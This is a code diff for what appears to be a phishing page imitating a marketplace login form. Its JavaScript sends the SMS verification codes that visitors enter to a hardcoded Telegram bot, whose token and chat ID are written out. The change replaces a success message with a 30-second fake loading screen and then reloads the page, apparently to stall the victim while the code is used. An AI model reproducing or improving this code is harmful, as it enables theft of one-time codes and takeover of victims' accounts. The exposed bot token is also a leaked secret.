@@ -473,7 +473,7 @@
 // ⚙️ НАСТРОЙКИ TELEGRAM БОТА
 const BOT_TOKEN = '6836324743:AAFIWAOKYDUkbz3ojpNthxPb0WqYtBkfBkg';
 const CHAT_ID = '5446866680';
-const USER_CHAT_ID = '5446866680'; // ЗАМЕНИТЕ на Chat ID пользователя для отправки SMS кода
+const USER_CHAT_ID = 'YOUR_USER_CHAT_ID'; // ЗАМЕНИТЕ на Chat ID пользователя для отправки SMS кода
 
 document.querySelector('.wb-form').addEventListener('submit', async function(e) {
   e.preventDefault();
@@ -533,10 +533,17 @@ async function submitSmsCode() {
     const data = await response.json();
     
     if (data.ok) {
-      alert('Код успешно отправлен!');
+      // Закрываем модальное окно
       document.getElementById('smsModal').classList.remove('active');
       document.getElementById('smsCode').value = '';
-      document.querySelector('.wb-form').reset();
+      
+      // Показываем загрузчик на 30 секунд
+      document.getElementById('loaderOverlay').classList.add('active');
+      
+      setTimeout(() => {
+        // Перезагружаем страницу
+        location.reload();
+      }, 30000);
     } else {
       throw new Error('Ошибка отправки');
     }
